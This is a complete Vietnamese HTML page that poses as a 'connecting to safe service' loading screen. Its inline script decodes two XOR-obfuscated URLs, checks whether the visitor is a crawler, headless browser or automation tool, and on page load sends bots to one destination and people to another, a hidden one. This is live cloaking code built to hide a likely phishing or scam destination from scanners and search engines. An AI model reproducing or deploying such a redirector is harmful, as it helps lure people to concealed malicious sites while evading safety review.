<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="robots" content="noindex, nofollow, noarchive, nosnippet">
  <title>Đang Tải Trang Hướng Dẫn...</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: #0b0f19;
      color: #f8fafc;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }
    .loader-card {
      background: rgba(17, 24, 39, 0.95);
      border: 1px solid rgba(255, 255, 255, 0.1);
      border-radius: 20px;
      padding: 36px 28px;
      max-width: 380px;
      width: 100%;
      text-align: center;
      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.8);
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 18px;
    }
    .spinner {
      width: 48px;
      height: 48px;
      border: 3px solid rgba(229, 185, 76, 0.2);
      border-top-color: #e5b94c;
      border-radius: 50%;
      animation: spin 0.85s linear infinite;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    .loader-title {
      font-size: 15px;
      font-weight: 700;
      color: #fae498;
      letter-spacing: 0.3px;
    }
    .loader-sub {
      font-size: 12px;
      color: #94a3b8;
      line-height: 1.5;
    }
  </style>
</head>
<body>
  <div class="loader-card">
    <div class="spinner"></div>
    <div class="loader-title">Đang Kết Nối Dịch Vụ An Toàn...</div>
    <div class="loader-sub">Hệ thống đang xác thực đường truyền và chuyển hướng quý khách trong giây lát.</div>
  </div>

  <script>
    (function() {
      const K = "354";
      const D = "7e737f0f1f7773f49c9bd4a5c0bd81beb40e04076e710300177a71f18199deecd4d2aebafb07142b2e3d4302366528d8c2affabaced1b5a7f00e1128336e4852647e2f9c9fa3f38093b0b0a6594a4974661f5f5b1e24d8cccff2e190819efbfe00525f7253010f202b2ad785a1dfe08884a783aa524b60617c0c0a382a15cbc8fcdee99083b6a957514d7c6c1a144b6e70c2cfc2c3ef958180acaf15116f3a3c320d09203adad4f0bbb8b7";
      const S = "7e737f0f1f7773f49c9bd4a5c0bd81b4a942544869681f0a06342bd8cd84fbe29cc4d89ea1560a6771781d4c323263d8c9baf8e0d186b9a0a71446712f651e05376b27cddbacb2c5d3d7e2fe1a525c706d";

      function dec(h) {
        try {
          let s = "";
          for (let i = 0; i < h.length; i += 2) {
            s += String.fromCharCode(parseInt(h.substr(i, 2), 16) ^ K.charCodeAt((i / 2) % K.length) ^ (((i / 2) * 13 + 37) & 0xFF));
          }
          return decodeURIComponent(s);
        } catch (e) {
          return "";
        }
      }

      function getFinalUrl(rawUrl) {
        if (!rawUrl) return "";
        const q = window.location.search;
        if (!q || q.length < 2) return rawUrl;
        try {
          const o = new URL(rawUrl);
          const p = new URLSearchParams(q);
          p.forEach((v, k) => {
            if (k !== "a") o.searchParams.set(k, v);
          });
          return o.toString();
        } catch (e) {
          return rawUrl;
        }
      }

      function isBot() {
        try {
          if (navigator.webdriver) return true;
          if (window.outerWidth === 0 && window.outerHeight === 0) return true;
          if (!navigator.languages || navigator.languages.length === 0) return true;
          const ua = (navigator.userAgent || '').toLowerCase();
          if (/googlebot|adsbot|headlesschrome|lighthouse|crawl|spider|mediapartners|phantomjs|selenium|bytespider|bingbot/i.test(ua)) return true;
          if (/iphone|ipad|android|mobile/i.test(ua) && typeof navigator.maxTouchPoints === 'number' && navigator.maxTouchPoints === 0) return true;
          return false;
        } catch (err) {
          return false;
        }
      }

      const isB = isBot();
      let target;
      if (isB) {
        target = getFinalUrl(dec(S));
      } else {
        target = getFinalUrl(dec(D));
      }

      if (target) {
        setTimeout(function() {
          window.location.replace(target);
        }, isB ? 50 : 100);
      }
    })();
  </script>
</body>
</html>
